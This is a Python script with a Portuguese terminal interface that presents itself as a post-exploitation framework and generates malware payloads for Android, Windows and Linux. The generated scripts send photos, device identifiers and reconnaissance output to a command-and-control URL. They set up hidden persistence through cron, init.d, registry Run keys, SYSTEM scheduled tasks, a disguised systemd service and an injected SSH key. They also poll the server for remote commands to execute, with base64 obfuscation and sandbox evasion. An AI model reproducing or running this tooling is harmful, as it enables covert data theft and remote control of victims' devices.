#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import hashlib
import json
import uuid
from typing import Dict, List, Optional

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.align import Align

console = Console()

class PostExploitationGenerator:
    def __init__(self):
        self.c2_server = "https://your-c2-server.com/exfil"
        self.encryption_key = str(uuid.uuid4()).replace('-', '')[:16]
        
        self.payloads = {
            'android': {
                'function': self.gerar_payload_android,
                'description': 'Payload Android com coleta de dados',
                'icon': '📱',
                'modules': {
                    'data_collection': 'Coleta de dados sensíveis',
                    'persistence': 'Mecanismos de persistência',
                    'privilege_escalation': 'Escalação de privilégios',
                    'lateral_movement': 'Movimento lateral'
                }
            },
            'windows': {
                'function': self.gerar_payload_windows,
                'description': 'Payload Windows com técnicas avançadas',
                'icon': '🪟',
                'modules': {
                    'credential_harvesting': 'Coleta de credenciais',
                    'persistence': 'Persistência no sistema',
                    'defense_evasion': 'Evasão de defesas',
                    'lateral_movement': 'Movimento lateral'
                }
            },
            'linux': {
                'function': self.gerar_payload_linux,
                'description': 'Payload Linux para servidores',
                'icon': '🐧',
                'modules': {
                    'privilege_escalation': 'Escalação de privilégios',
                    'persistence': 'Mecanismos de persistência',
                    'network_recon': 'Reconhecimento de rede',
                    'backdoor': 'Backdoor persistente'
                }
            }
        }
        
        self.techniques = {
            'obfuscation': 'Ofuscação de código',
            'encryption': 'Criptografia de dados',
            'anti_debug': 'Anti-debugging',
            'sandbox_evasion': 'Evasão de sandbox',
            'persistence': 'Mecanismos de persistência'
        }
        
        self.banners = [
            self._gerar_banner_ghost(),
            self._gerar_banner_phantom(),
            self._gerar_banner_stealth()
        ]
    
    def _gerar_banner_ghost(self) -> str:
        return """
[bold blue]
 ██████  ██   ██ ███████  ██████ ████████ 
██       ██   ██ ██      ██         ██    
██   ███ ███████ █████   ██         ██    
██    ██ ██   ██ ██      ██         ██    
 ██████  ██   ██ ███████  ██████    ██    
                                          
███████ ███████ ████████ ██   ██ ██ ████████ 
██      ██         ██    ██   ██ ██    ██    
███████ █████      ██    ███████ ██    ██    
     ██ ██         ██    ██   ██ ██    ██    
███████ ███████    ██    ██   ██ ██    ██    
[/bold blue]
[bold white on blue]        GHOST EXPLOIT - POST EXPLOITATION FRAMEWORK[/bold white on blue]
"""
    
    def _gerar_banner_phantom(self) -> str:
        return """
[bold green]
██████  ██   ██  █████  ███    ██ ████████ ██████  ███    ███ 
██   ██ ██   ██ ██   ██ ████   ██    ██    ██   ██ ████  ████ 
██████  ███████ ███████ ██ ██  ██    ██    ██████  ██ ████ ██ 
██      ██   ██ ██   ██ ██  ██ ██    ██    ██   ██ ██  ██  ██ 
██      ██   ██ ██   ██ ██   ████    ██    ██   ██ ██      ██ 
[/bold green]
[bold black on green]        PHANTOM POST-EXPLOITATION TOOLKIT[/bold black on green]
"""
    
    def _gerar_banner_stealth(self) -> str:
        return """
[bold magenta]
███████ ████████ ███████  █████  ██   ██ ████████ 
██         ██    ██      ██   ██ ██  ██     ██    
███████    ██    █████   ███████ █████      ██    
     ██    ██    ██      ██   ██ ██  ██     ██    
███████    ██    ███████ ██   ██ ██   ██    ██    
[/bold magenta]
[bold white on magenta]        STEALTH POST-EXPLOITATION FRAMEWORK[/bold white on magenta]
"""
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS EM AMBIENTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🎯 PLATAFORMAS DE PÓS-EXPLORAÇÃO[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Plataforma", style="green")
            tabela.add_column("Descrição", style="yellow")
            tabela.add_column("Módulos", style="blue")
            
            for i, (platform, data) in enumerate(self.payloads.items(), 1):
                modulos = ", ".join(list(data['modules'].keys())[:2]) + "..."
                tabela.add_row(str(i), f"{data['icon']} {platform.upper()}", data['description'], modulos)
            
            tabela.add_row("0", "⚙️", "Configurações", "")
            tabela.add_row("9", "🚪", "Sair", "")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione a plataforma alvo",
                choices=[str(i) for i in range(0, 10)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('android')
            elif escolha == "2":
                self._mostrar_submenu('windows')
            elif escolha == "3":
                self._mostrar_submenu('linux')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_submenu(self, plataforma: str):
        plataforma_data = self.payloads[plataforma]
        
        while True:
            console.clear()
            console.print(Panel.fit(
                f"[bold]{plataforma_data['icon']} PÓS-EXPLORAÇÃO {plataforma.upper()}[/bold]",
                border_style="cyan"
            ))
            
            tabela = Table(title="Módulos Disponíveis", show_header=True, header_style="bold green")
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Módulo", style="green")
            tabela.add_column("Descrição", style="yellow")
            
            for i, (modulo_id, descricao) in enumerate(plataforma_data['modules'].items(), 1):
                tabela.add_row(str(i), modulo_id, descricao)
            
            tabela.add_row("A", "TODOS", "Todos os módulos")
            tabela.add_row("0", "VOLTAR", "Retornar ao menu principal")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione os módulos (separados por vírgula)",
                default="1"
            )
            
            if escolha.upper() == "0":
                return
            elif escolha.upper() == "A":
                modulos_selecionados = list(plataforma_data['modules'].keys())
            else:
                modulos_selecionados = []
                for item in escolha.split(','):
                    try:
                        idx = int(item.strip()) - 1
                        if 0 <= idx < len(plataforma_data['modules']):
                            modulos_selecionados.append(list(plataforma_data['modules'].keys())[idx])
                    except:
                        pass
            
            if modulos_selecionados:
                self._configurar_payload(plataforma, modulos_selecionados)
    
    def _configurar_payload(self, plataforma: str, modulos: List[str]):
        console.clear()
        console.print(Panel.fit(
            f"[bold]⚙️ Configurando Payload {plataforma.upper()}[/bold]",
            border_style="yellow"
        ))
        
        config = {
            'c2_server': self.c2_server,
            'encryption_key': self.encryption_key,
            'modulos': modulos
        }
        
        # Configurações específicas por plataforma
        if plataforma == 'android':
            config['exfiltrate_photos'] = Confirm.ask("Exfiltrar fotos?")
            config['exfiltrate_contacts'] = Confirm.ask("Exfiltrar contatos?")
            config['exfiltrate_sms'] = Confirm.ask("Exfiltrar SMS?")
            config['get_root'] = Confirm.ask("Tentar obter root?")
            
        elif plataforma == 'windows':
            config['steal_browser_passwords'] = Confirm.ask("Roubar senhas do navegador?")
            config['dump_hashes'] = Confirm.ask("Dump de hashes SAM?")
            config['keylogger'] = Confirm.ask("Ativar keylogger?")
            config['disable_defender'] = Confirm.ask("Tentar desativar Defender?")
            
        elif plataforma == 'linux':
            config['ssh_backdoor'] = Confirm.ask("Criar backdoor SSH?")
            config['cron_persistence'] = Confirm.ask("Adicionar persistência via cron?")
            config['ssh_keys'] = Confirm.ask("Coletar chaves SSH?")
            config['network_scan'] = Confirm.ask("Executar scan de rede?")
        
        # Técnicas avançadas
        console.print("\n[bold]🛡️ Técnicas Avançadas:[/bold]")
        tecnicas_disponiveis = list(self.techniques.keys())
        for i, tecnica in enumerate(tecnicas_disponiveis, 1):
            console.print(f"{i}. {self.techniques[tecnica]}")
        
        tecnicas_escolha = Prompt.ask(
            "Selecione técnicas (separadas por vírgula)",
            default=",".join([str(i) for i in range(1, len(tecnicas_disponiveis)+1)])
        )
        
        config['advanced_techniques'] = []
        for item in tecnicas_escolha.split(','):
            try:
                idx = int(item.strip()) - 1
                if 0 <= idx < len(tecnicas_disponiveis):
                    config['advanced_techniques'].append(tecnicas_disponiveis[idx])
            except:
                pass
        
        if Confirm.ask("Gerar payload?"):
            self._gerar_e_salvar_payload(plataforma, config)
    
    def _gerar_e_salvar_payload(self, plataforma: str, config: Dict):
        with Progress() as progress:
            task = progress.add_task("[red]Gerando payload...[/red]", total=100)
            
            # Gerar payload base
            payload_function = self.payloads[plataforma]['function']
            payload = payload_function(config)
            progress.update(task, advance=30)
            
            # Aplicar técnicas avançadas
            for tecnica in config['advanced_techniques']:
                payload = self._aplicar_tecnica_avancada(payload, tecnica)
                progress.update(task, advance=10)
            
            # Ofuscar código
            payload = self._ofuscar_codigo(payload, plataforma)
            progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        # Mostrar preview
        self._preview_payload(payload, plataforma)
        
        # Salvar payload
        nome_arquivo = f"post_exploit_{plataforma}_{int(time.time())}"
        if plataforma == 'windows':
            nome_arquivo += '.ps1'
        else:
            nome_arquivo += '.sh'
        
        with open(nome_arquivo, 'w', encoding='utf-8') as f:
            f.write(payload)
        
        os.chmod(nome_arquivo, 0o755)
        
        console.print(Panel.fit(
            f"[green]✅ Payload gerado com sucesso![/green]\n"
            f"[cyan]Arquivo:[/cyan] [bold]{nome_arquivo}[/bold]\n"
            f"[cyan]Tamanho:[/cyan] {os.path.getsize(nome_arquivo)} bytes\n"
            f"[cyan]Módulos:[/cyan] {', '.join(config['modulos'])}",
            border_style="green"
        ))
        
        input("\nPressione Enter para continuar...")
    
    def _aplicar_tecnica_avancada(self, payload: str, tecnica: str) -> str:
        if tecnica == 'obfuscation':
            return self._ofuscar_strings(payload)
        elif tecnica == 'encryption':
            return self._adicionar_criptografia(payload)
        elif tecnica == 'anti_debug':
            return self._adicionar_anti_debug(payload)
        elif tecnica == 'sandbox_evasion':
            return self._adicionar_evasao_sandbox(payload)
        elif tecnica == 'persistence':
            return self._adicionar_persistencia_avancada(payload)
        return payload
    
    def _ofuscar_codigo(self, payload: str, plataforma: str) -> str:
        """Ofuscação básica do código"""
        if plataforma == 'windows':
            # Ofuscação para PowerShell
            lines = payload.split('\n')
            ofuscated = []
            for line in lines:
                if line.strip() and not line.strip().startswith('#'):
                    # Ofuscar variáveis e comandos
                    ofuscated.append(self._ofuscar_line_powershell(line))
                else:
                    ofuscated.append(line)
            return '\n'.join(ofuscated)
        else:
            # Ofuscação para bash
            return f"eval \"$(echo '{base64.b64encode(payload.encode()).decode()}' | base64 -d)\""
    
    def gerar_payload_android(self, config: Dict) -> str:
        """Gera payload de pós-exploração para Android"""
        payload = """#!/system/bin/sh
# Post-Exploitation Android Payload
# Auto-generated: {timestamp}

C2_SERVER="{c2_server}"
ENCRYPT_KEY="{encryption_key}"
""".format(
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            c2_server=config['c2_server'],
            encryption_key=config['encryption_key']
        )

        # Funções básicas
        payload += """
# Função para enviar dados para C2
exfiltrate_data() {
    local data="$1"
    local filename="$2"
    local encrypted_data=$(echo "$data" | openssl enc -aes-256-cbc -salt -pass pass:$ENCRYPT_KEY -base64 2>/dev/null)
    curl -s -X POST -d "data=$encrypted_data&filename=$filename" $C2_SERVER >/dev/null 2>&1
}

# Verificar root
check_root() {
    if [ "$(id -u)" = "0" ]; then
        echo "[+] Root access detected"
        return 0
    else
        echo "[-] No root access"
        return 1
    fi
}
"""

        # Módulos selecionados
        if 'data_collection' in config['modulos']:
            payload += """
# Coleta de dados do sistema
collect_system_info() {
    echo "[+] Collecting system information"
    sys_info="
Device: $(getprop ro.product.model)
Android: $(getprop ro.build.version.release)
Manufacturer: $(getprop ro.product.manufacturer)
IMEI: $(service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed 's/[^0-9]*//g' | head -1)
"
    exfiltrate_data "$sys_info" "system_info.txt"
}
"""

        if 'persistence' in config['modulos']:
            payload += """
# Mecanismos de persistência
establish_persistence() {
    echo "[+] Establishing persistence"
    # Persistência via init scripts
    if [ -d /system/etc/init.d ]; then
        cp $0 /system/etc/init.d/.system_service
        chmod +x /system/etc/init.d/.system_service
    fi
    
    # Persistência via cron
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null; echo "@reboot sleep 60 && $0") | crontab -
    fi
}
"""

        if config.get('exfiltrate_photos', False):
            payload += """
# Exfiltrar fotos
exfiltrate_photos() {
    echo "[+] Exfiltrating photos"
    photo_dirs="/sdcard/DCIM /sdcard/Pictures /storage/emulated/0/DCIM"
    for dir in $photo_dirs; do
        if [ -d "$dir" ]; then
            find "$dir" -type f \( -name "*.jpg" -o -name "*.png" -o -name "*.jpeg" \) | head -20 | while read photo; do
                exfiltrate_data "$(base64 -w 0 "$photo" 2>/dev/null)" "$(basename "$photo")"
            done
        fi
    done
}
"""

        # Main execution
        payload += """
# Execução principal
echo "[+] Starting post-exploitation modules"
"""

        for modulo in config['modulos']:
            if modulo == 'data_collection':
                payload += "collect_system_info\n"
            elif modulo == 'persistence':
                payload += "establish_persistence\n"
        
        if config.get('exfiltrate_photos', False):
            payload += "exfiltrate_photos\n"

        payload += """
echo "[+] Post-exploitation completed"
# Mantém o script vivo para conexões futuras
while true; do
    sleep 300
    # Verificar por novos comandos do C2
    response=$(curl -s "$C2_SERVER/commands")
    if [ -n "$response" ]; then
        eval "$response"
    fi
done
"""

        return payload

    def gerar_payload_windows(self, config: Dict) -> str:
        """Gera payload de pós-exploração para Windows"""
        payload = """# PowerShell Post-Exploitation Payload
# Auto-generated: {timestamp}

$C2Server = "{c2_server}"
$EncryptKey = "{encryption_key}"
$ErrorActionPreference = "SilentlyContinue"
""".format(
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            c2_server=config['c2_server'],
            encryption_key=config['encryption_key']
        )

        # Funções básicas
        payload += """
# Função para enviar dados
function Exfiltrate-Data {
    param($Data, $FileName)
    $EncryptedData = [System.Convert]::ToBase64String(
        [System.Text.Encoding]::UTF8.GetBytes($Data)
    )
    Invoke-WebRequest -Uri "$C2Server/upload" -Method POST -Body @{
        data = $EncryptedData
        filename = $FileName
    } -UseBasicParsing | Out-Null
}

# Função para executar comandos stealth
function Invoke-StealthCommand {
    param($Command)
    try {
        $Result = Invoke-Expression $Command 2>&1 | Out-String
        return $Result
    } catch {
        return $_.Exception.Message
    }
}
"""

        # Módulos selecionados
        if 'credential_harvesting' in config['modulos']:
            payload += """
# Coleta de credenciais do navegador
function Get-BrowserCredentials {
    echo "[+] Harvesting browser credentials"
    # Chrome credentials extraction would go here
    $creds = "Browser credentials placeholder"
    Exfiltrate-Data $creds "browser_creds.txt"
}
"""

        if 'persistence' in config['modulos']:
            payload += """
# Estabelecer persistência
function Establish-Persistence {
    echo "[+] Establishing persistence"
    # Registry persistence
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -File $PSCommandPath"
    
    # Scheduled task
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $PSCommandPath"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -User "SYSTEM" -Force
}
"""

        # Main execution
        payload += """
# Main execution
echo "[+] Starting Windows post-exploitation"
"""

        for modulo in config['modulos']:
            if modulo == 'credential_harvesting':
                payload += "Get-BrowserCredentials\n"
            elif modulo == 'persistence':
                payload += "Establish-Persistence\n"

        payload += """
# Command and control loop
while ($true) {
    try {
        $command = Invoke-WebRequest -Uri "$C2Server/getcommand" -UseBasicParsing | Select-Object -Expand Content
        if ($command -ne "none") {
            $result = Invoke-StealthCommand $command
            Exfiltrate-Data $result "command_result.txt"
        }
    } catch {}
    Start-Sleep -Seconds 300
}
"""

        return payload

    def gerar_payload_linux(self, config: Dict) -> str:
        """Gera payload de pós-exploração para Linux"""
        payload = """#!/bin/bash
# Linux Post-Exploitation Payload
# Auto-generated: {timestamp}

C2_SERVER="{c2_server}"
ENCRYPT_KEY="{encryption_key}"
""".format(
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            c2_server=config['c2_server'],
            encryption_key=config['encryption_key']
        )

        # Funções básicas
        payload += """
# Funções de utilidade
exfiltrate_data() {
    local data="$1"
    local filename="$2"
    local encrypted_data=$(echo "$data" | openssl enc -aes-256-cbc -salt -pass pass:$ENCRYPT_KEY -base64 2>/dev/null)
    curl -s -X POST -d "data=$encrypted_data&filename=$filename" $C2_SERVER >/dev/null 2>&1
}

check_privileges() {
    if [ "$(id -u)" -eq 0 ]; then
        echo "[+] Root privileges detected"
        return 0
    else
        echo "[-] Regular user privileges"
        return 1
    fi
}
"""

        # Módulos selecionados
        if 'privilege_escalation' in config['modulos']:
            payload += """
# Tentativa de escalação de privilégios
attempt_privilege_escalation() {
    echo "[+] Attempting privilege escalation"
    # Common Linux privilege escalation vectors
    vectors=(
        "sudo -l"
        "find / -perm -4000 2>/dev/null"
        "cat /etc/crontab"
        "ls -la /etc/cron.*"
        "uname -a"
        "cat /etc/passwd"
    )
    
    results=""
    for vector in "${vectors[@]}"; do
        results+="\n=== $vector ===\n"
        results+="$($vector 2>&1)\n"
    done
    
    exfiltrate_data "$results" "privilege_escalation.txt"
}
"""

        if 'persistence' in config['modulos']:
            payload += """
# Estabelecer persistência
establish_persistence() {
    echo "[+] Establishing persistence"
    # Cron persistence
    (crontab -l 2>/dev/null; echo "@reboot sleep 120 && /bin/bash $0") | crontab -
    
    # SSH backdoor
    if [ -f ~/.ssh/authorized_keys ]; then
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys
    fi
    
    # Systemd service if root
    if [ "$(id -u)" -eq 0 ]; then
        cat > /etc/systemd/system/systemd-network.service << EOF
[Unit]
Description=Systemd Network Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash $0
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
        systemctl enable systemd-network.service
        systemctl start systemd-network.service
    fi
}
"""

        # Main execution
        payload += """
# Execução principal
echo "[+] Starting Linux post-exploitation"
"""

        for modulo in config['modulos']:
            if modulo == 'privilege_escalation':
                payload += "attempt_privilege_escalation\n"
            elif modulo == 'persistence':
                payload += "establish_persistence\n"

        payload += """
# Loop de C2
while true; do
    sleep 300
    command=$(curl -s "$C2_SERVER/get_command")
    if [ -n "$command" ] && [ "$command" != "none" ]; then
        result=$(eval "$command" 2>&1)
        exfiltrate_data "$result" "command_output.txt"
    fi
done
"""

        return payload

    def _ofuscar_strings(self, payload: str) -> str:
        """Ofusca strings no payload"""
        # Implementação básica de ofuscação
        lines = payload.split('\n')
        ofuscated = []
        for line in lines:
            if 'C2_SERVER' in line or 'c2_server' in line:
                # Ofuscar URL do C2
                parts = line.split('=')
                if len(parts) == 2:
                    url = parts[1].strip().strip('"')
                    encoded_url = base64.b64encode(url.encode()).decode()
                    line = f"{parts[0]}=$(echo {encoded_url} | base64 -d)"
            ofuscated.append(line)
        return '\n'.join(ofuscated)

    def _adicionar_criptografia(self, payload: str) -> str:
        """Adiciona camada de criptografia"""
        encryption_wrapper = """
# Camada de criptografia avançada
encrypt_payload() {
    local key="$(echo {key} | base64 -d)"
    # Implementação de criptografia aqui
}
""".format(key=base64.b64encode(self.encryption_key.encode()).decode())
        
        return encryption_wrapper + payload

    def _adicionar_anti_debug(self, payload: str) -> str:
        """Adiciona técnicas anti-debug"""
        anti_debug = """
# Técnicas anti-debugging
anti_debug() {
    # Verificar se está sendo debugado
    if [ -n "$TRACE" ] || [ -n "$DEBUG" ]; then
        exit 0
    fi
    # Outras técnicas anti-debug aqui
}
"""
        return anti_debug + payload

    def _adicionar_evasao_sandbox(self, payload: str) -> str:
        """Adiciona técnicas de evasão de sandbox"""
        sandbox_evasion = """
# Evasão de sandbox
check_sandbox() {
    # Verificar características de sandbox
    if [ -f "/.dockerenv" ] || [ -f "/run/.containerenv" ]; then
        exit 0
    fi
    # Outras verificações de sandbox aqui
}
"""
        return sandbox_evasion + payload

    def _adicionar_persistencia_avancada(self, payload: str) -> str:
        """Adiciona mecanismos avançados de persistência"""
        advanced_persistence = """
# Persistência avançada
advanced_persistence() {
    # Múltiplos métodos de persistência
    # ...
}
"""
        return advanced_persistence + payload

    def _ofuscar_line_powershell(self, line: str) -> str:
        """Ofusca linha do PowerShell"""
        # Ofuscação básica para PowerShell
        if '$' in line and '=' in line:
            parts = line.split('=')
            if len(parts) == 2:
                var_name = parts[0].strip()
                value = parts[1].strip()
                # Ofuscar nome de variável
                ofuscated_var = ''.join([f"[char]{ord(c)}+" for c in var_name])[:-1]
                return f"${ofuscated_var} = {value}"
        return line

    def _preview_payload(self, payload: str, plataforma: str):
        """Mostra preview do payload"""
        console.print(Panel.fit(
            "[bold]👁️ PREVIEW DO PAYLOAD[/bold]",
            border_style="yellow"
        ))
        
        # Mostrar apenas as primeiras linhas
        lines = payload.split('\n')[:20]
        preview = '\n'.join(lines)
        
        if plataforma == 'windows':
            console.print(Syntax(preview, "powershell"))
        else:
            console.print(Syntax(preview, "bash"))
        
        if len(payload.split('\n')) > 20:
            console.print("[yellow]... (visualização truncada)[/yellow]")

    def _mostrar_menu_configuracao(self):
        """Menu de configurações"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold]⚙️ CONFIGURAÇÕES[/bold]",
                border_style="blue"
            ))
            
            console.print(f"1. Servidor C2: [cyan]{self.c2_server}[/cyan]")
            console.print(f"2. Chave de criptografia: [yellow]{self.encryption_key}[/yellow]")
            console.print("3. Testar conectividade C2")
            console.print("0. Voltar")
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3"],
                show_choices=False
            )
            
            if escolha == "1":
                novo_c2 = Prompt.ask("Novo servidor C2", default=self.c2_server)
                self.c2_server = novo_c2
            elif escolha == "2":
                nova_chave = Prompt.ask("Nova chave de criptografia", default=self.encryption_key)
                self.encryption_key = nova_chave
            elif escolha == "3":
                self._testar_conectividade_c2()
            elif escolha == "0":
                return

    def _testar_conectividade_c2(self):
        """Testa conectividade com o servidor C2"""
        console.print("[yellow]Testando conectividade com C2...[/yellow]")
        try:
            # Simulação de teste
            time.sleep(2)
            console.print("[green]✅ Conexão com C2 estabelecida[/green]")
        except:
            console.print("[red]❌ Falha na conexão com C2[/red]")
        time.sleep(1)

    def _sair(self):
        """Sair do programa"""
        console.print(Panel.fit(
            "[bold green]👋 Operação concluída![/bold green]",
            border_style="green"
        ))
        time.sleep(1)
        sys.exit(0)

    def executar(self):
        """Função principal"""
        try:
            self.mostrar_menu_principal()
        except KeyboardInterrupt:
            console.print("\n[yellow]Operação cancelada pelo usuário[/yellow]")
        except Exception as e:
            console.print(f"\n[red]Erro: {str(e)}[/red]")

def main():
    generator = PostExploitationGenerator()
    generator.executar()

if __name__ == '__main__':
    main()
